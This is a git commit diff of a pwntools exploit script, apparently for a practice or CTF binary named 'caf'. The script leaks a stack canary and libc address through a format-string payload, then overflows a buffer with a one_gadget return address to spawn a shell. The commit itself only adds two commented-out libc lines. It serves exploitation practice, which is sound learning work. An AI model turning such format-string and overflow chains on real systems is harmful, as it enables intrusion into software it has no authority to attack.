1edfdb3dc8ee837a257aa5d0b49d27206e8d7eda
Eren Şimşek <57567358+Aporlorxl23@users.noreply.github.com>
2022-02-26 00:37:56 +0300

    Update caf.py

--- Pwn/Liveoverflow/caf.py
+++ Pwn/Liveoverflow/caf.py
@@ -3,6 +3,7 @@ from pwn import *
 context(terminal = ["tmux","splitw","-h"], os="linux", arch ="amd64")
 proc = process("./caf")
 libc = proc.libc
+#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
 proc.recv()
 payload = b"%p "*39
 proc.sendline(payload)
@@ -12,6 +13,7 @@ Canary = int(All[462:462+18].decode(), 16)
 log.info("Leak: "+ hex(Leak))
 log.info("Canary: "+ hex(Canary))
 #gdb.attach(proc)
+#libc.address = Leak - libc.sym['_IO_2_1_stdin_']
 payload = b"X"*264+p64(Canary)+p64(0)+p64(libc.address + 0xe6c81)
 proc.sendline(payload)
 proc.interactive()
